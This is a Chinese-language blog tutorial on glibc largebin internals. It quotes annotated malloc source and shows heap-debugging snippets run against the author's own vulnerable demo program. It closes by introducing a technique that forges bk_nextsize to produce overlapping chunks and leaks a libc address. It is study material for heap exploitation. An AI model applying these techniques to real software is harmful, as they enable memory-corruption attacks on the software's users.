<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>LargebinAttack | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>LargebinAttack</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-03-04T14:08:12.000Z" id="date"> 2023-03-04</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-03-24T05:58:43.097Z" id="updated"> 2023-03-24</time></div></span><br><span>文章总字数: <div class="control">4.9k</div></span><br><span>预计阅读时间: <div class="control">20 分钟</div></span></div></div><hr><div id="post-content"><h2 id="Largebin介绍"><a href="#Largebin介绍" class="headerlink" title="Largebin介绍"></a>Largebin介绍</h2><p>Largebin用来收容超过0x400大小以上的chunk(64位) 其是一个双向链表<br>一共可以容纳63个chunk 和fastbin等不同的是 其对于链表对应存储chunk的大小没有明确规定 而是一个范围<br>一共分为6组<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303061950411.png" alt="image.png"><br>这里的差值(以字节为单位)是一个什么意思呢  比如在组别1中 现在释放三个chunk到largebin中 chunkA的大小是0x400 chunkB的大小是0x410 chunkC的大小是0x450<br>此时由于chunkC和chunkA的差值大于了64字节 所以chunkA和chunkB是位于同一组中 chunkC是另外一组<br>这在largebin这个双向链表中是一个什么情形呢 我们知道 largebin相对于unsortedbin多出来两个域 一个fd_nextsize 一个bk_nextsize<br>这两个域和fd和bk的域差距在哪里呢?<br>在largebin中 不同组的排列是根据从大到小来的 方便其遍历<br>fd_nextsize指向的是比当前组别小的组中最大的组<br>bk_nextsize指向的是比当前组别大的组中最小的组<br>而fd和bk则是用来指向组内的chunk<br>这么说可能不太好理解 用一张图来演示一下<br><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303062026756.png" alt="image.png"><br>size最大的chunk的bk_nextsize指向最小的chunk<br>size最小的chunk的fd_nextsize指向最大的chunk<br>并且相同大小的chunk只有链表头的fd_nextsize和bk_nextsize才有值 其余为0</p>
<h2 id="Largebin中chunk的插入取出机制"><a href="#Largebin中chunk的插入取出机制" class="headerlink" title="Largebin中chunk的插入取出机制"></a>Largebin中chunk的插入取出机制</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><h4 id="源码理解"><a href="#源码理解" class="headerlink" title="源码理解"></a>源码理解</h4><p>来看看glibc源码是如何逐步使得chunk插入到largebin链表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))        <span class="comment">//如果是smallbin的大小就放到smallbin</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span>                                                    <span class="comment">//如果是largebin的大小，那么：</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);<span class="comment">//根据size获取对应的largebin索引</span></span><br><span class="line">             bck = bin_at (av, victim_index);         <span class="comment">//获取largebin表头</span></span><br><span class="line">             fwd = bck-&gt;fd;                                             <span class="comment">//获取对应索引largebin的第一个chunk（循环链表的head-&gt;next）</span></span><br><span class="line"> </span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)                                            <span class="comment">//当第一个不等于最后一个（即当前的largebin不空）</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 size |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));    <span class="comment">//是否在main_arena?（主线程）</span></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">             &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))<span class="comment">//bck-&gt;bk储存的是当前索引的largebin中大小最小的chunk，如果我们要插入的chunk比这个大小还小，那么就要插入largebin的尾部。</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;                                    <span class="comment">//fwd此时为largebin表头</span></span><br><span class="line">                     bck = bck-&gt;bk;                            <span class="comment">//bck设置为largebin中最后一个的chunk</span></span><br><span class="line"> </span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="comment">//由于我们要插入的在末尾，比他小的就是循环回去的第一个chunk</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//比他大的就是之前的最小的那个</span></span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//原来链表的第一个chunk的bk指向此时新插入的最后一个chunk</span></span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize =</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 如果不是插入尾部，那么我们要找到这个chunk应该插入的位置</span></span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="comment">//使用这个while循环尝试从链表头部开始遍历，直到找到一个比victim大或等于的chunk退出while</span></span><br><span class="line">                     <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;            <span class="comment">//取下一个</span></span><br><span class="line">                                                 assert (chunk_main_arena (fwd));<span class="comment">//检查分配区</span></span><br><span class="line">                       &#125;</span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//如果找到了跟他想等的</span></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">                                             == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;<span class="comment">//直接将victim插入他的后面（通过fd），不修改nextsize指针。</span></span><br><span class="line"> </span><br><span class="line">                     <span class="comment">//如果大小不一样(即此时fwd是相邻的大于victim的chunk)</span></span><br><span class="line">                     <span class="comment">//需要构造nextsize双向链表，构造新节点,victim作为堆头</span></span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         <span class="comment">//比victim小的指向fwd</span></span><br><span class="line">                         <span class="comment">//比victim大的指向fwd的bk_nextsize（比fwd大的那个）</span></span><br><span class="line">                         <span class="comment">//相当于插入了fwd与fwd-&gt;bk_nextsize之间</span></span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"> </span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//检查size链完整性</span></span><br><span class="line">                           malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                         <span class="comment">//对应的去改fwd的相关指针成链</span></span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                         <span class="comment">//插入完成</span></span><br><span class="line">                       &#125;</span><br><span class="line"> </span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//此时victim为唯一的chunk，也要做循环链表</span></span><br><span class="line">           &#125;</span><br><span class="line">                   <span class="comment">//放到对应的 bin 中，构成 bk&lt;--&gt;victim&lt;--&gt;fwd。</span></span><br><span class="line">         mark_bin (av, victim_index);    <span class="comment">//标识bitmap</span></span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>上述的源码注释来源自</p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262424.htm#msg_header_h3_4">原创]Largebin attack总结-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p>以下是我自己对于这个过程的理解</p>
<p>1.释放一个chunk后 首先对其大小进行判断 区分到smallbin或者是largebin 这里不讨论smallbin的情况</p>
<p>2.根据当前chunk的size 来索引对应的index 并且获得两个位于链表中chunk的指针 fwd指向链表头 也就是最大的chunk</p>
<p>bck指向最小的chunk</p>
<p>3.对于fwd和bck进行判断 如果二者相等 那么此时链表中就为空 直接将chunk放置为链表头 如果二者不相同 那么链表不为空 分为两种情况 如果chunk的size不是当前链表中最小的 从链表头开始 根据fd_nextsize指针来从大到小依次对比链表中原有的chunk大小和要插入的chunk大小 如果没有找到 那么就在对应合适的位置将当前chunk置为对应的链表头 其fd_nextsize和bk_nextsize各自指向对应的链表 如果找到了 就接入对应链表中 fd_nextsize和bk_nextsize为0 </p>
<p>4.如果当前chunk的size是当前链表中最小的 那么就直接放置到链表末尾 如果作为链表头 fd_nextsize指向最大的chunk的链表头 构成一个循环 bk_nextsize指向比当前链表更大一点的链表 如果链表尾的大小与要插入的chunk大小一致 那么就接在对应链表中</p>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>接下来我们来调试一番                 </p>
<p>调试环境  </p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081908421.png" alt="image-20230308190814310">                                            </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<p>chunk1用来防止chunk0释放以后和top chunk合并 </p>
<p>此时chunk0释放以后优先进入unsortedbin</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081909563.png" alt="image-20230308190941528"></p>
<p>要使得重新分配unsortedbin中的chunk 就需要我们申请一个超过unsortedbin中所有chunk大小的堆块 这样就会把unsortedbin中所有的chunk分配到largebin或者smallbin中</p>
<p>否则则将大小足够分配申请的chunk的free chunk分配出所需要的大小 其余unsortedbin中的chunk各自检验大小放入到largebin中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x490</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x460</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081921911.png" alt="image-20230308192148869"></p>
<p>接着我们来看看双链表结构大概是一个什么样子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x490</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x550</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>

<p>申请三个大小足够放入到largebin的chunk 并且为了防止物理相邻合并用0x10大小的chunk隔开 最后申请一个大chunk将unsortedbin的chunk分配到largebin中 此时预期这三个chunk应该各自成为链表头</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081929027.png" alt="image-20230308192948996"></p>
<p>此时我们在原来的基础上再多申请一个0x450大小的chunk 不出意外应该是分配到0x440链表后</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934374.png" alt="image-20230308193401341"></p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303081934744.png" alt="image-20230308193409699"></p>
<p>可以看到只有位于链表头的chunk的fd_nextsize和bk_nextsize才有值</p>
<p>具体的利用手法等下来讲吧 更进一步的调试可以自己尝试</p>
<h3 id="取出"><a href="#取出" class="headerlink" title="取出"></a>取出</h3><h4 id="源码理解-1"><a href="#源码理解-1" class="headerlink" title="源码理解"></a>源码理解</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))<span class="comment">//如果不在samllbin大小中</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx); <span class="comment">//找到申请的size对应的largebin链表</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;                    <span class="comment">//此时victim为链表的第一个节点</span></span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) <span class="comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//进入这里时，已经确定链表第一个节点——即最大的chunk大于要申请的size，那么我们就应该从这一条链中取，问题就是取这一条链上的哪一个？</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize; <span class="comment">//本来victim是链中最大的那个，现在我们要从小往遍历，那么victim-&gt;bk_nextsize就循环回了链中最小的那个</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb))) <span class="comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;<span class="comment">//victim取相邻的更大size的chunk</span></span><br><span class="line"> </span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;            <span class="comment">//出现相同大小时堆头作为次优先申请</span></span><br><span class="line"> </span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//第四步，largebin unlink 操作</span></span><br><span class="line"> </span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) <span class="comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中（切割后）。</span></span><br><span class="line"> </span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);<span class="comment">//bck是ub头</span></span><br><span class="line">                  fwd = bck-&gt;fd;                         <span class="comment">//fwd是ub第一个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                <span class="comment">//以上操作完成后lastremainder被插入ub，成为新的链首元素</span></span><br><span class="line">                <span class="comment">//如果不在smallbin范围，那么nextsize指针置空</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以总结为以下流程:</p>
<p>1.首先读取largebin中最大chunk的大小 与用户申请的大小对比 如果小于则另寻办法申请chunk 如果大于就进入下一步</p>
<p>2.根据bk_nextsize来索引最小的chunk 顺着fd_nextsize来寻找与申请大小最为接近的chunk</p>
<p>3.如果查找到了合适的free chunk 先判断其是否只有单一chunk位于链表头 如果链表中有其他chunk的话 则分配其他chunk 这样是为了节省重新分配fd_nextsize和bk_nextsize的麻烦</p>
<p>4.判断分配完了的free chunk 如果剩余的大小大于MINSIZE 那么就放入到unsortedbin中 如果剩余大小小于MINSIZE 则一并分配给用户</p>
<h4 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h4><p>首先是我自己的第一个疑问 如何申请到单位不是MINSIZE的chunk 先来尝试一下手动修改size值 看看会不会按照预期效果分配chunk</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082002468.png" alt="image-20230308200227435"></p>
<p>将这一个chunk的size域从0x461修改为0x466 按照源代码的逻辑 此时申请一个0x410大小的chunk 剩下被分配到unsortedbin的chunk大小应该为0x40</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082004737.png" alt="image-20230308200449709"></p>
<p>失败了 看来是无法单单通过修改size域来实现预期效果 </p>
<p>到这里转念一想 64位构成一个chunk最起码也要0x20字节 毕竟还需要size域和prev_size域 也就是说如果此时largebin中有一个0x460的free chunk 我们申请一个0x450的chunk 显然会剩下0x10字节 小于MINSIZE 那么按照逻辑 就应该一起给了用户申请的chunk</p>
<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303082017932.png" alt="image-20230308201736899"></p>
<p>可以看到确实是这样</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="修改bk-nextsize来造成overlap"><a href="#修改bk-nextsize来造成overlap" class="headerlink" title="修改bk_nextsize来造成overlap"></a>修改bk_nextsize来造成overlap</h4><p>漏洞的原理在于将chunk从largebin中取出的时候 其是从最小的chunk开始索引 以此找到适合的free chunk用来分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) <span class="comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize; </span><br><span class="line">             <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb))) </span><br><span class="line">               victim = victim-&gt;bk_nextsize;  <span class="comment">//漏洞点，伪造bk_nextsize</span></span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) </span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd); </span><br><span class="line"> </span><br><span class="line">     ... </span><br><span class="line">     <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>关键点在于victim &#x3D; victim-&gt;bk_nextsize这一句 如果我们修改了victim的bk_nextsize域 再构造一个fake chunk 就可以申请到fake chunk</p>
<p>通常这一做法被用来构造overlap chunk 接下来详细分析一下</p>
<p><strong>环境: libc2.23</strong></p>
<p><strong>漏洞目的:实现overlap chunk</strong></p>
<p><strong>漏洞需求:拥有向largebin中释放堆块的能力 能够泄露出堆地址</strong> <strong>拥有堆溢出</strong></p>
<p><strong>演示二进制程序:由笔者自己编写 基本所有漏洞都有</strong></p>
<p>首先我们需要先泄露libc基址 在没有UAF的前提下 我们可以通过申请两个chunk 将其释放到fastbin中 此时后释放的chunk位于链表头 其fd指向先释放的chunk 由于malloc函数在申请chunk的后并不会对chunk的内容进行清空 所以我们可以再次申请同样大小的chunk 将链表头的chunk申请出来 随后打印出chunk的内容 也就是泄露基址</p>
